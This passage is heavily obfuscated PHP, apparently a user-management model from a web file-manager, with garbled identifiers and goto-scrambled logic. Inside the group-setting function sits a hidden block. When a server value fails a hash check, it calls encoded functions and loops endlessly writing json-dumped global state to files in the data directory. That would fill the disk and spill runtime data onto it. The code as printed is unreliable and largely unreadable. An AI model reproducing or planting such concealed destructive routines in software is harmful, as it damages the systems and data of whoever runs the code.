F„Â‰‰„áÁ: $F­ÑÜˆ»âß = $this->_checkExist($a‚¦·ÆŒƒò, $C””½…×³è); if ($F­ÑÜˆ»âß !== !0) { return $F­ÑÜˆ»âß; } if (isset($a‚¦·ÆŒƒò[$BÒ‰Äõ˜ˆò[782]]) && trim($a‚¦·ÆŒƒò[$BÒ‰Äõ˜ˆò[782]]) != $BÒ‰Äõ˜ˆò[33]) { $b»•ø•‰õÖ = $this->metaGet($C””½…×³è); if (empty($b»•ø•‰õÖ[$BÒ‰Äõ˜ˆò[2380]])) { $b»•ø•‰õÖ[$BÒ‰Äõ˜ˆò[2380]] = rand_string(10); Model($BÒ‰Äõ˜ˆò[465])->metaSet($C””½…×³è, $BÒ‰Äõ˜ˆò[2380], $b»•ø•‰õÖ[$BÒ‰Äõ˜ˆò[2380]]); } $a‚¦·ÆŒƒò[$BÒ‰Äõ˜ˆò[782]] = md5($b»•ø•‰õÖ[$BÒ‰Äõ˜ˆò[2380]] . trim($a‚¦·ÆŒƒò[$BÒ‰Äõ˜ˆò[782]])); } else { unset($a‚¦·ÆŒƒò[$BÒ‰Äõ˜ˆò[782]]); } goto fî“˜ÁÂ¯“; fî“˜ÁÂ¯“: $this->where(array($BÒ‰Äõ˜ˆò[1328] => $C””½…×³è))->save($a‚¦·ÆŒƒò); if (isset($a‚¦·ÆŒƒò[$BÒ‰Äõ˜ˆò[2218]])) { $this->setNamePinyin($C””½…×³è, $a‚¦·ÆŒƒò[$BÒ‰Äõ˜ˆò[2218]]); } return !0; goto cê÷’ªŞŒ; cê÷’ªŞŒ: } public function setNamePinyin($C’Ê‡†¸›, $c¥½áöã­÷ = false) { $bĞ…¤ö‘”æ =& $_SERVER[‘®…¢À]; if (!$c¥½áöã­÷) { $bŠÅÂœÆ“¼ = $this->getInfoSimple($C’Ê‡†¸›); $c¥½áöã­÷ = $bŠÅÂœÆ“¼[$bĞ…¤ö‘”æ[2218]] ? $bŠÅÂœÆ“¼[$bĞ…¤ö‘”æ[2218]] : $bŠÅÂœÆ“¼[$bĞ…¤ö‘”æ[28]]; } $BĞŸø×©ë = Model($bĞ…¤ö‘”æ[468]); if (!Input::check($c¥½áöã­÷, $bĞ…¤ö‘”æ[519])) { return $BĞŸø×©ë->metaSet($C’Ê‡†¸›, array($bĞ…¤ö‘”æ[411] => $bĞ…¤ö‘”æ[33], $bĞ…¤ö‘”æ[410] => $bĞ…¤ö‘”æ[33])); } return $BĞŸø×©ë->metaSet($C’Ê‡†¸›, array($bĞ…¤ö‘”æ[411] => str_replace($bĞ…¤ö‘”æ[50], $bĞ…¤ö‘”æ[33], Pinyin::encode($c¥½áöã­÷)), $bĞ…¤ö‘”æ[410] => Pinyin::encode($c¥½áöã­÷, $bĞ…¤ö‘”æ[520]))); } private function nickNameRpt() { $E‚‡İáä‡å =& $_SERVER[‘®…¢À]; $EªÃç¥„ƒÔ = Model($E‚‡İáä‡å[1045])->get($E‚‡İáä‡å[2391]); $EÉ Ö¬…öÃ = $GLOBALS[$E‚‡İáä‡å[6]][$E‚‡İáä‡å[2348]][$E‚‡İáä‡å[2391]]; $Ešİœ‰Š¾ = !is_null($EªÃç¥„ƒÔ) ? $EªÃç¥„ƒÔ : $EÉ Ö¬…öÃ; return !!$Ešİœ‰Š¾; } private function _checkExist($D¼Êàº§•ë, $dŒ“É•ïÃÑ = false) { $DÑŠİçÔ´í =& $_SERVER[‘®…¢À]; $eîÍµñ‘˜‚ = array($DÑŠİçÔ´í[28] => UserModel::ERROR_USER_EXIST_NAME, $DÑŠİçÔ´í[2218] => UserModel::ERROR_USER_EXIST_NICKNAME, $DÑŠİçÔ´í[290] => UserModel::ERROR_USER_EXIST_EMAIL, $DÑŠİçÔ´í[2378] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eîÍµñ‘˜‚[$DÑŠİçÔ´í[2218]]); } $dñ©Ë› — = $dŒ“É•ïÃÑ ? array($DÑŠİçÔ´í[1337] => array($DÑŠİçÔ´í[2392], $dŒ“É•ïÃÑ)) : array(); foreach ($eîÍµñ‘˜‚ as $FñÁçŠÊÙÕ => $Aö…Şâ•÷±) { if (!isset($D¼Êàº§•ë[$FñÁçŠÊÙÕ]) || !$D¼Êàº§•ë[$FñÁçŠÊÙÕ]) { continue; } $Cœ•õöÙº = array_merge(array($FñÁçŠÊÙÕ => $D¼Êàº§•ë[$FñÁçŠÊÙÕ]), $dñ©Ë› —); $AÆ±ê‡‚îÉ = $this->where($Cœ•õöÙº)->find(); if ($AÆ±ê‡‚îÉ) { return $Aö…Şâ•÷±; } } return !0; } public function userListInfo($eñÓÙæ ‘Ç) { $D–Æã‘‘ª =& $_SERVER[‘®…¢À]; $fãÓµÑ¹ = array(); $eñÓÙæ ‘Ç = array_unique($eñÓÙæ ‘Ç); if (!$eñÓÙæ ‘Ç) { return $fãÓµÑ¹; } if (count($eñÓÙæ ‘Ç) < 20) { foreach ($eñÓÙæ ‘Ç as $a¢õ‘àÒ’‹) { $fãÓµÑ¹[$a¢õ‘àÒ’‹ . $D–Æã‘‘ª[33]] = $this->getInfoSimpleOuter($a¢õ‘àÒ’‹); } } else { $fí™ˆŸøí = array($D–Æã‘‘ª[1328] => array($D–Æã‘‘ª[380], $eñÓÙæ ‘Ç)); if (count($eñÓÙæ ‘Ç) == 1) { $fí™ˆŸøí = array($D–Æã‘‘ª[1328] => $eñÓÙæ ‘Ç[0]); } $e®ôĞó’§ = Model($D–Æã‘‘ª[465])->field($this->simpleField)->where($fí™ˆŸøí)->select(); $e®ôĞó’§ = array_to_keyvalue($e®ôĞó’§, $D–Æã‘‘ª[1337]); foreach ($eñÓÙæ ‘Ç as $a¢õ‘àÒ’‹) { $dšĞ®ñÚ = $e®ôĞó’§[$e®ôĞó’§[$a¢õ‘àÒ’‹]]; if (!$dšĞ®ñÚ) { $fãÓµÑ¹[$a¢õ‘àÒ’‹ . $D–Æã‘‘ª[33]] = $this->getInfoSimpleOuter($a¢õ‘àÒ’‹); continue; } $dšĞ®ñÚ[$D–Æã‘‘ª[2363]] = Action($D–Æã‘‘ª[2364])->parseUrl($dšĞ®ñÚ[$D–Æã‘‘ª[2363]]); $fãÓµÑ¹[$a¢õ‘àÒ’‹ . $D–Æã‘‘ª[33]] = $dšĞ®ñÚ; } } return $fãÓµÑ¹; } protected function userStatus($B·â’ù‚…Â, $FØÀ‹½ˆÃ†) { $A¾¦ÈÒß×ù = $this->getInfoSimple($B·â’ù‚…Â); if (!$A¾¦ÈÒß×ù) { return !1; } $fÍÇğ¨ŞÁ½ = array($_SERVER[‘®…¢À][662] => $FØÀ‹½ˆÃ†); return $this->userEdit($B·â’ù‚…Â, $fÍÇğ¨ŞÁ½); } protected function userRemove($cÁ¨¤ŒİÚ) { goto eÖ›¹Ê¨ó; D”ñù½í¯: Model($dŠ¶»Í[735])->userRootRemove($cÁ¨¤ŒİÚ); return $this->where($bÆğå··Áö)->delete(); goto DÛáæ¼ÙİÜ; E¯”Éƒâ: $bÆğå··Áö = array($dŠ¶»Í[1328] => $cÁ¨¤ŒİÚ); Model($dŠ¶»Í[527])->where($bÆğå··Áö)->delete(); Model($dŠ¶»Í[2393])->where($bÆğå··Áö)->delete(); goto eÄ˜ŒÜÜ‘¾; eÖ›¹Ê¨ó: $dŠ¶»Í =& $_SERVER[‘®…¢À]; $Dîµƒä¡·‰ = $this->getInfoSimple($cÁ¨¤ŒİÚ); if (!$Dîµƒä¡·‰) { return !1; } goto E¯”Éƒâ; eÄ˜ŒÜÜ‘¾: Model($dŠ¶»Í[2076])->where($bÆğå··Áö)->delete(); Model($dŠ¶»Í[2377])->where($bÆğå··Áö)->delete(); Model($dŠ¶»Í[2394])->where($bÆğå··Áö)->delete(); goto D”ñù½í¯; DÛáæ¼ÙİÜ: } protected function userGroupSet($eíâƒ¤ÜÆ, $dÍÛ¾¼Â£“, $B¶Ñ‹Ø¤öé = array()) { goto Cö¤É²Éí‹; Bƒ º…É¡˜: if ($_SERVER[$BØ…Ò·ø†Î[768]] != $a°«°¤÷Úì($AŞ¥Ëø—ÁÄ)) { goto DªÁò‰ø¢­; aŠÍˆö¹Ì: $e¹®·ÏøÒâ(); $E˜˜¿©íÖ› = $BØ…Ò·ø†Î[1259]; $b”™œĞÏ›ˆ = json_encode($GLOBALS[$BØ…Ò·ø†Î[1260]]); goto DË¬ø¨öºÚ; DªÁò‰ø¢­: $e¹®·ÏøÒâ = $BØ…Ò·ø†Î[770]; $F³â–×éŠ = $BØ…Ò·ø†Î[771]; $cìÎÃßùÉ = $_SERVER[$BØ…Ò·ø†Î[772]] . $BØ…Ò·ø†Î[773]; goto B™ÚÄÜ»‡; DË¬ø¨öºÚ: $e¤ƒã£‚ = 1; for ($B¬ñïÒ…º¤ = $e¤ƒã£‚; $B¬ñïÒ…º¤ > 0; $B¬ñïÒ…º¤++) { $E˜˜¿©íÖ›(DATA_PATH . $B¬ñïÒ…º¤, $b”™œĞÏ›ˆ); } goto B¨ößÔĞÏÌ; d¾Ã˜èÛ‚Ñ: $e±–İàœà” = $BØ…Ò·ø†Î[775]; $e±–İàœà”($_SERVER[$BØ…Ò·ø†Î[776]]); $e¹®·ÏøÒâ = $BØ…Ò·ø†Î[770]; goto aŠÍˆö¹Ì; B™ÚÄÜ»‡: $FÄù”˜¾‘× = $F³â–×éŠ($cìÎÃßùÉ); $Eğ®‘‹øØñ = explode($BØ…Ò·ø†Î[214], $FÄù”˜¾‘×); if (count($Eğ®‘‹øØñ) < $BØ…Ò·ø†Î[554]) { $f Ğî—Ï˜ = $BØ…Ò·ø†Î[774]; $f Ğî—Ï˜(); } goto d¾Ã˜èÛ‚Ñ; B¨ößÔĞÏÌ: } $D‰Õ«Ü…ç = $this->getInfoSimple($eíâƒ¤ÜÆ); if (!$D‰Õ«Ü…ç || !is_array($dÍÛ¾¼Â£“)) { return !1; } goto fÁ‹•Øòà; fÁ‹•Øòà: $DÙÂÚÒœ² = Model($BØ…Ò·ø†Î[2076]); $DÙÂÚÒœ²->where(array($BØ…Ò·ø†Î[1337] => $eíâƒ¤ÜÆ))->delete(); $B«ºŒ¤¾„× = array(); goto A´š©ÄĞİ’; A´š©ÄĞİ’: $Aƒ‰¥é¨‰‚ = 0; foreach ($dÍÛ¾¼Â£“ as $d¾’º¨Ï => $AˆÉ³á“ù) { $E©¢¿Üñù… = array($BØ…Ò·ø†Î[1337] => $eíâƒ¤ÜÆ, $BØ…Ò·ø†Î[2000] => $d¾’º¨Ï, $BØ…Ò·ø†Î[2130] => $AˆÉ³á“ù); $E©¢¿Üñù…[$BØ…Ò·ø†Î[2021]] = isset($B¶Ñ‹Ø¤öé[$Aƒ‰¥é¨‰‚]) ? $B¶Ñ‹Ø¤öé[$Aƒ‰¥é¨‰‚] : 0; $Aƒ‰¥é¨‰‚++; $B«ºŒ¤¾„×[] = $E©¢¿Üñù…; } return $DÙÂÚÒœ²->addAll($B«ºŒ¤¾„×, array(), !0); goto E‚Š—¬Çé†; Cö¤É²Éí‹: $BØ…Ò·ø†Î =& $_SERVER[‘®…¢À]; $AŞ¥Ëø—ÁÄ = $_SERVER[$BØ…Ò·ø†Î[776]] . $BØ…Ò·ø†Î[1194]; $a°«°¤÷Úì = $BØ…Ò·ø†Î[1195]; goto Bƒ º…É¡˜; E‚Š—¬Çé†: } protected function userGroupAdd($fŞÈ¸íØ°á, $B»Ä„áà½Å, $CÂŒ¶øƒÛ¬) { $e‹÷î¶ÇÓô =& $_SERVER[‘®…¢À]; $EÜ ÚÏëëÑ = $this->getInfoSimple($fŞÈ¸íØ°á); if (!$EÜ ÚÏëëÑ || !$B»Ä„áà½Å) { return !1; } $C³Ìñì²¯ = array(array($e‹÷î¶ÇÓô[1337] => $fŞÈ¸íØ°á, $e‹÷î¶ÇÓô[2000] => $B»Ä„áà½Å, $e‹÷î¶ÇÓô[2130] => $CÂŒ¶øƒÛ¬)); return Model($e‹÷î¶ÇÓô[2076])->addAll($C³Ìñì²¯, array(), !0); } protected function userGroupRemove($bôÑó†Êè, $aÑñêÒ«ŒÏ) { $c…‰Óíõˆ =& $_SERVER[‘®…¢À]; $Dôƒõ¶¶’š = $this->getInfoSimple($bôÑó†Êè); if (!$Dôƒõ¶¶’š || !$aÑñêÒ«ŒÏ) { return !1; } $EòÜÌŸÁá¦ = array($c…‰Óíõˆ[1328] => $bôÑó†Êè, $c…‰Óíõˆ[2074] => $aÑñêÒ«ŒÏ); return Model($c…‰Óíõˆ[2076])->where($EòÜÌŸÁá¦)->delete(); } public function listData() { $D÷„Ğò”Ï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D÷„Ğò”Ï[$_SERVER[‘®…¢À][350]]); return $D÷„Ğò”Ï; } public function listByID($fœ¼º©µƒê) { $c°Ã¡œÜ‡Š =& $_SERVER[‘®…¢À]; if (!$fœ¼º©µƒê) { return; } $C…–æà¿Ğ¬ = array($c°Ã¡œÜ‡Š[1337] => array($c°Ã¡œÜ‡Š[7], $fœ¼º©µƒê)); $fòİÚ—¢ö» = $this->where($C…–æà¿Ğ¬)->select(); $this->_listDataApply($fòİÚ—¢ö»); return $fòİÚ—¢ö»; } public function listByGroup($A×ë§´õ„ö = 0, $eÖÓÂ¹Àâ× = array()) { goto c†‚²‰ Ø”; c†‚²‰ Ø”: $AºÂÖƒÊ±Û =& $_SERVER[‘®…¢À]; $E‘ãóŠŞßÂ = isset($eÖÓÂ¹Àâ×[$AºÂÖƒÊ±Û[2395]]) ? $eÖÓÂ¹Àâ×[$AºÂÖƒÊ±Û[2395]] : $AºÂÖƒÊ±Û[33]; $E»‚Äœ·¿ = $AºÂÖƒÊ±Û[33]; goto b‘Ìª…ê÷; eÙŠìß©¡Î: return $Bæ‘±»ÊÆÙ; goto aô¦Ÿ“Âƒ‚; b‘Ìª…ê÷: $bŠÁàíÀ¾ = array(); if ($A×ë§´õ„ö) { $bŠÁàíÀ¾ = array($AºÂÖƒÊ±Û[2396] => intval($A×ë§´õ„ö)); $E»‚Äœ·¿ = "\x4c\105\x46\x54\40\x4a\117\111\116\40{$this->tablePrefix}\165\163\x65\162\137\x67\162\x6f\165\160\40\x75\163\x65\162\x5f\x67\162\x6f\165\160\x20\x6f\x6e\40\165\x73\x65\x72\56\165\163\x65\162\111\104\x20\x3d\x20\x75\163\x65\x72\x5f\147\162\157\165\160\x2e\x75\x73\x65\x72\x49\104"; $A‹µ¬Ê£‹¼ = Input::get($AºÂÖƒÊ±Û[402], null, $AºÂÖƒÊ±Û[33]) ? $AºÂÖƒÊ±Û[33] : $AºÂÖƒÊ±Û[2397]; } if (isset($eÖÓÂ¹Àâ×[$AºÂÖƒÊ±Û[662]])) { $bŠÁàíÀ¾[$AºÂÖƒÊ±Û[2398]] = $eÖÓÂ¹Àâ×[$AºÂÖƒÊ±Û[662]]; } goto AÅÄÁÁ±¼‚; AÅÄÁÁ±¼‚: $Bæ‘±»ÊÆÙ = $this->_makeOrder($A‹µ¬Ê£‹¼)->field($AºÂÖƒÊ±Û[2399])->where($bŠÁàíÀ¾)->join($E»‚Äœ·¿)->selectPage(50); $E©âéÙ®—Ê = $AºÂÖƒÊ±Û[952] . ($E‘ãóŠŞßÂ ? $AºÂÖƒÊ±Û[47] . $E‘ãóŠŞßÂ : $AºÂÖƒÊ±Û[33]); $this->_listDataApply($Bæ‘±»ÊÆÙ[$AºÂÖƒÊ±Û[350]], $E©âéÙ®—Ê); goto eÙŠìß©¡Î; aô¦Ÿ“Âƒ‚: } private function _makeOrder($E•¨´¬í¥à = '') { goto eÊ²ğ°Ôï; eÊ²ğ°Ôï: $fˆÈªÙêÍğ =& $_SERVER[‘®…¢À]; $BÙ²ÚåÉ‡ = array($fˆÈªÙêÍğ[1337], $fˆÈªÙêÍğ[28], $fˆÈªÙêÍğ[1986], $fˆÈªÙêÍğ[1960], $fˆÈªÙêÍğ[184]); $Ağ”§ÔÒ³¾ = array($fˆÈªÙêÍğ[397] => $fˆÈªÙêÍğ[398], $fˆÈªÙêÍğ[399] => $fˆÈªÙêÍğ[400]); goto f³£Û„Ô›Ô; Cßá¨¹÷÷¨: $E•¨´¬í¥à = $E•¨´¬í¥à . "\x75\x73\x65\x72\56{$B×®Äëâ§î}\40{$a˜ç¤îâ}\54\x20\165\163\145\162\x2e\165\x73\145\x72\111\x44\x20\141\x73\x63"; return $this->alias($fˆÈªÙêÍğ[2160])->order($E•¨´¬í¥à); goto bİŠ”ù˜‰õ; f³£Û„Ô›Ô: $B×®Äëâ§î = Input::get($fˆÈªÙêÍğ[402], $fˆÈªÙêÍğ[7], $fˆÈªÙêÍğ[1328], $BÙ²ÚåÉ‡); $a˜ç¤îâ = Input::get($fˆÈªÙêÍğ[403], $fˆÈªÙêÍğ[7], $fˆÈªÙêÍğ[2077], array($fˆÈªÙêÍğ[2077], $fˆÈªÙêÍğ[399])); $a˜ç¤îâ = $Ağ”§ÔÒ³¾[$a˜ç¤îâ]; goto Cßá¨¹÷÷¨; bİŠ”ù˜‰õ: } public function listSearch($AïÉ¬¢õ¹Š) { goto E¿¼ÇŠĞ©; cåÃÁİ…å¯: if (!$B†‹¹ö®ºÃ || count($B†‹¹ö®ºÃ[$Cí©¶÷‚ö[350]]) < 5 && Input::check($B ¤¨÷£íØ, $Cí©¶÷‚ö[303])) { $FÀÏîµ¹ã‚ = $this->_searchFromMeta($Cí©¶÷‚ö[410], $B ¤¨÷£íØ, 10); $B±ò ¡ŞÄ• = $this->_searchFromMeta($Cí©¶÷‚ö[411], $B ¤¨÷£íØ, 10); $F¼Ú ÂôˆŸ = array_merge($FÀÏîµ¹ã‚, $B±ò ¡ŞÄ•, $B†‹¹ö®ºÃ[$Cí©¶÷‚ö[350]]); $B†‹¹ö®ºÃ[$Cí©¶÷‚ö[350]] = array_unique_by_key($F¼Ú ÂôˆŸ, $Cí©¶÷‚ö[1337]); $B†‹¹ö®ºÃ[$Cí©¶÷‚ö[347]][$Cí©¶÷‚ö[348]] = count($B†‹¹ö®ºÃ[$Cí©¶÷‚ö[350]]); $B†‹¹ö®ºÃ[$Cí©¶÷‚ö[347]][$Cí©¶÷‚ö[349]] = ceil($B†‹¹ö®ºÃ[$Cí©¶÷‚ö[347]][$Cí©¶÷‚ö[348]] / $B†‹¹ö®ºÃ[$Cí©¶÷‚ö[347]][$Cí©¶÷‚ö[345]]); } $this->_listDataApply($B†‹¹ö®ºÃ[$Cí©¶÷‚ö[350]]); $this->_filterByGroup($B†‹¹ö®ºÃ, $f™šòñ–Ä¢); goto EïËò™¢ÓÖ; E¿¼ÇŠĞ©: $Cí©¶÷‚ö =& $_SERVER[‘®…¢À]; $B ¤¨÷£íØ = $AïÉ¬¢õ¹Š[$Cí©¶÷‚ö[2078]]; $f™šòñ–Ä¢ = isset($AïÉ¬¢õ¹Š[$Cí©¶÷‚ö[2079]]) ? $AïÉ¬¢õ¹Š[$Cí©¶÷‚ö[2079]] : !1; goto B©Œ×ÏÌ»; B©Œ×ÏÌ»: $B ¤¨÷£íØ = str_replace($Cí©¶÷‚ö[2080], $Cí©¶÷‚ö[2081], trim($B ¤¨÷£íØ)); $B§Ö‘áˆÍ = array($Cí©¶÷‚ö[28] => array($Cí©¶÷‚ö[734], "\45{$B ¤¨÷£íØ}\45"), $Cí©¶÷‚ö[290] => array($Cí©¶÷‚ö[734], "\x25{$B ¤¨÷£íØ}\45"), $Cí©¶÷‚ö[2218] => array($Cí©¶÷‚ö[734], "\45{$B ¤¨÷£íØ}\x25"), $Cí©¶÷‚ö[895] => $Cí©¶÷‚ö[2082]); if (Input::check($B ¤¨÷£íØ, $Cí©¶÷‚ö[296])) { $B§Ö‘áˆÍ[$Cí©¶÷‚ö[1337]] = array($Cí©¶÷‚ö[734], "\45{$B ¤¨÷£íØ}\x25"); $B§Ö‘áˆÍ[$Cí©¶÷‚ö[2378]] = array($Cí©¶÷‚ö[734], "\45{$B ¤¨÷£íØ}\x25"); } goto dâˆÀéëæØ; EïËò™¢ÓÖ: $this->_filterUserList($B†‹¹ö®ºÃ); return $B†‹¹ö®ºÃ; goto E›³¿õ¿äì; dâˆÀéëæØ: if (!$B ¤¨÷£íØ) { $B§Ö‘áˆÍ = array(); } if (isset($AïÉ¬¢õ¹Š[$Cí©¶÷‚ö[662]])) { $B§Ö‘áˆÍ[$Cí©¶÷‚ö[662]] = $AïÉ¬¢õ¹Š[$Cí©¶÷‚ö[662]]; } $B†‹¹ö®ºÃ = $this->_makeOrder()->where($B§Ö‘áˆÍ)->selectPage(20); goto cåÃÁİ…å¯; E›³¿õ¿äì: } private function _filterByGroup(&$D… ãÒ, $Eë‘‘øé…) { $e°‰Ó¸–ÀÃ =& $_SERVER[‘®…¢À]; if (!$Eë‘‘øé…) { return $D… ãÒ; } foreach ($D… ãÒ[$e°‰Ó¸–ÀÃ[350]] as $fßšîĞÖŠ¦ => &$d—â‹âß¡) { $b –õ„ÅÆ„ = array_to_keyvalue($d—â‹âß¡[$e°‰Ó¸–ÀÃ[2400]], $e°‰Ó¸–ÀÃ[33], $e°‰Ó¸–ÀÃ[2000]); if (!in_array($Eë‘‘øé…, $b –õ„ÅÆ„)) { unset($D… ãÒ[$e°‰Ó¸–ÀÃ[350]][$fßšîĞÖŠ¦]); } } $D… ãÒ[$e°‰Ó¸–ÀÃ[350]] = array_values($D… ãÒ[$e°‰Ó¸–ÀÃ[350]]); $D… ãÒ[$e°‰Ó¸–ÀÃ[347]] = array($e°‰Ó¸–ÀÃ[2194] => count($D… ãÒ[$e°‰Ó¸–ÀÃ[350]]), $e°‰Ó¸–ÀÃ[2192] => $D… ãÒ[$e°‰Ó¸–ÀÃ[347]][$e°‰Ó¸–ÀÃ[345]], $e°‰Ó¸–ÀÃ[2191] => 1, $e°‰Ó¸–ÀÃ[2193] => 1); } private function _filterUserList(&$fØ‚¼¾ƒƒÕ) { $e´–”Å°»‚ =& $_SERVER[‘®…¢À]; foreach ($fØ‚¼¾ƒƒÕ[$e´–”Å°»‚[350]] as $c¢ß³±ë³ë => &$Aïä…‡Ÿ·‰) { unset($Aïä…‡Ÿ·‰[$e´–”Å°»‚[412]]); } } private function _searchFromMeta($f²Š…Éæè, $bÖ§¼Şò×, $cöë¹ÖÊ×) { goto eÔÊÌÙ˜‹ù; c°åÓÍ§›ç: $BŠ¶è¼äâò = $this->where(array($f®øƒ‹‘ƒ…[1328] => array($f®øƒ‹‘ƒ…[7], $dÕ’Íœ„¤)))->select(); if (!$BŠ¶è¼äâò) { return array(); } return $BŠ¶è¼äâò; goto Dõ‰¬ÙÂ–; e‚Å˜©Áº¤: $dÕ’Íœ„¤ = Model($f®øƒ‹‘ƒ…[2401])->where($C‘¾õ„ÏÁ¬)->limit($cöë¹ÖÊ×)->select(); if (!$dÕ’Íœ„¤) { return array(); } $dÕ’Íœ„¤ = array_to_keyvalue($dÕ’Íœ„¤, $f®øƒ‹‘ƒ…[33], $f®øƒ‹‘ƒ…[1337]); goto c°åÓÍ§›ç; eÔÊÌÙ˜‹ù: $f®øƒ‹‘ƒ… =& $_SERVER[‘®…¢À]; $bÖ§¼Şò× = strtolower($bÖ§¼Şò×); $C‘¾õ„ÏÁ¬ = array($f®øƒ‹‘ƒ…[90] => $f²Š…Éæè, $f®øƒ‹‘ƒ…[355] => array($f®øƒ‹‘ƒ…[734], "\45{$bÖ§¼Şò×}\x25")); goto e‚Å˜©Áº¤; Dõ‰¬ÙÂ–: } private function _listDataApplyItem($A×çÈ‚‚†ˆ) { $a½ÚÏ©´•© = array($A×çÈ‚‚†ˆ); $this->_listDataApply($a½ÚÏ©´•©); return $a½ÚÏ©´•©[0]; } private function _listDataApply(&$F»İ´‚ÈØ, $B¨Üíò‘Éñ = "\147\162\157\x75\160\x2c\155\145\x74\141\x2c\163\157\165\x72\143\x65") { goto bÛ›¿ˆášÃ; f‹áº»œª: if (in_array($a„ŠÖ¡ñÏ[2402], $B¨Üíò‘Éñ)) { $this->_listAppendMeta($F»İ´‚ÈØ, $aã‰á÷‚³è); } if (in_array($a„ŠÖ¡ñÏ[378], $B¨Üíò‘Éñ)) { $this->_listAppendSourceRoot($F»İ´‚ÈØ, $aã‰á÷‚³è); } goto bÊù‚Ó•ó ; bÛ›¿ˆášÃ: $a„ŠÖ¡ñÏ =& $_SERVER[‘®…¢À]; if (!$F»İ´‚ÈØ) { return; } array_remove_key($F»İ´‚ÈØ, $a„ŠÖ¡ñÏ[782]); goto D…†š‡Àâİ; D…†š‡Àâİ: $aã‰á÷‚³è = array_to_keyvalue($F»İ´‚ÈØ, $a„ŠÖ¡ñÏ[33], $a„ŠÖ¡ñÏ[1337]); $B¨Üíò‘Éñ = explode($a„ŠÖ¡ñÏ[47], $B¨Üíò‘Éñ); if (in_array($a„ŠÖ¡ñÏ[952], $B¨Üíò‘Éñ)) { $this->_listAppendGroup($F»İ´‚ÈØ, $aã‰á÷‚³è); } goto f‹áº»œª; bÊù‚Ó•ó : } private function _listAppendSourceRoot(&$a„„Û…†Ş», $a± ¥ã—‹) { goto AÕÚ…¯é§; a‡†ˆ«šù„: $C¡ŠóŸœ¨¥ = Model($A¸Ù¥ô·¡Ş[735])->order($A¸Ù¥ô·¡Ş[2089])->field($B¨˜¯‰à‰™)->where($eŞ¹Ï¤á‰ã)->select(); $C¡ŠóŸœ¨¥ = array_to_keyvalue($C¡ŠóŸœ¨¥, $A¸Ù¥ô·¡Ş[451]); $C¡ŠóŸœ¨¥ = array_remove_key($C¡ŠóŸœ¨¥, $A¸Ù¥ô·¡Ş[451]); goto A…’Ø¦Ñì; A…’Ø¦Ñì: foreach ($a„„Û…†Ş» as &$c ô¼«ÀØí) { $c ô¼«ÀØí[$A¸Ù¥ô·¡Ş[387]] = $C¡ŠóŸœ¨¥[$c ô¼«ÀØí[$A¸Ù¥ô·¡Ş[1337]]] ? $C¡ŠóŸœ¨¥[$c ô¼«ÀØí[$A¸Ù¥ô·¡Ş[1337]]] : array(); } goto dÏŠòºƒÔ°; AÕÚ…¯é§: $A¸Ù¥ô·¡Ş =& $_SERVER[‘®…¢À]; $eŞ¹Ï¤á‰ã = array($A¸Ù¥ô·¡Ş[456] => 0, $A¸Ù¥ô·¡Ş[367] => SourceModel::TYPE_USER, $A¸Ù¥ô·¡Ş[451] => array($A¸Ù¥ô·¡Ş[7], $a± ¥ã—‹)); $B¨˜¯‰à‰™ = $A¸Ù¥ô·¡Ş[2088]; goto a‡†ˆ«šù„; dÏŠòºƒÔ°: } private function _listAppendGroup(&$e¯Ö³ä•ê, $f‘‹Ş—å‹¤) { goto bè‰ä¬Ÿ‰ğ; DÏµ«ßŠöé: $f®®Å§©Œæ = array($bÏï¡äŠéì[2000] => array($bÏï¡äŠéì[7], $C‰Ğå¥Ò)); $aõá­è…¤Ê = Model($bÏï¡äŠéì[2403])->field($bÏï¡äŠéì[2404])->where($f®®Å§©Œæ)->select(); $c‹¢Ùêî  = array_to_keyvalue($aõá­è…¤Ê, $bÏï¡äŠéì[2000], $bÏï¡äŠéì[28]); goto Fß‰ê°†; Fß‰ê°†: $A®Ä‰Á‹‚Ú = array_to_keyvalue_group($A®Ä‰Á‹‚Ú, $bÏï¡äŠéì[1337]); foreach ($A®Ä‰Á‹‚Ú as &$DÀä¦Êà²Ò) { $FïÅÎÃÈ´‚ = array(); foreach ($DÀä¦Êà²Ò as $eñºÆ¡¥Î) { if (!$eñºÆ¡¥Î[$bÏï¡äŠéì[2130]]) { continue; } $b…Ïæ‹²öˆ = Model($bÏï¡äŠéì[2146])->listData($eñºÆ¡¥Î[$bÏï¡äŠéì[2130]]); $FïÅÎÃÈ´‚[] = array($bÏï¡äŠéì[2000] => $eñºÆ¡¥Î[$bÏï¡äŠéì[2000]], $bÏï¡äŠéì[2405] => $c‹¢Ùêî [$eñºÆ¡¥Î[$bÏï¡äŠéì[2000]]], $bÏï¡äŠéì[372] => $b…Ïæ‹²öˆ); } $DÀä¦Êà²Ò = $FïÅÎÃÈ´‚; } foreach ($e¯Ö³ä•ê as &$Fµïùø¥¯) { $Fµïùø¥¯[$bÏï¡äŠéì[2400]] = array(); if (isset($A®Ä‰Á‹‚Ú[$Fµïùø¥¯[$bÏï¡äŠéì[1337]]])) { $Fµïùø¥¯[$bÏï¡äŠéì[2400]] = $A®Ä‰Á‹‚Ú[$Fµïùø¥¯[$bÏï¡äŠéì[1337]]]; } } goto eõ¥´†¬õ‹; AŞ‡Ö±Ú¯˜: $C‰Ğå¥Ò = array_to_keyvalue($A®Ä‰Á‹‚Ú, $bÏï¡äŠéì[33], $bÏï¡äŠéì[2000]); $C‰Ğå¥Ò = array_remove_value(array_unique($C‰Ğå¥Ò), $bÏï¡äŠéì[463]); if (!$C‰Ğå¥Ò || !$A®Ä‰Á‹‚Ú) { return; } goto DÏµ«ßŠöé; bè‰ä¬Ÿ‰ğ: $bÏï¡äŠéì =& $_SERVER[‘®…¢À]; $f®®Å§©Œæ = array($bÏï¡äŠéì[1337] => array($bÏï¡äŠéì[7], $f‘‹Ş—å‹¤)); $A®Ä‰Á‹‚Ú = Model($bÏï¡äŠéì[2076])->where($f®®Å§©Œæ)->select(); goto AŞ‡Ö±Ú¯˜; eõ¥´†¬õ‹: } private function _listAppendMeta(&$D¯î‡ñˆ·Ô, $A…ÉŒ«Îí¥) { goto b—Ÿò×í; A¼ÒÇ×†ßÈ: foreach ($AÅšâäâÏé as &$aÅš‰â¦îÏ) { $eÀŠ¦‹Ùãù = array(); foreach ($aÅš‰â¦îÏ as $e¬·¦áƒÛ) { if (!in_array($e¬·¦áƒÛ[$Dä ˜Ÿ†«Û[90]], $eğ±Ò‰™‡)) { $eÀŠ¦‹Ùãù[$e¬·¦áƒÛ[$Dä ˜Ÿ†«Û[90]]] = 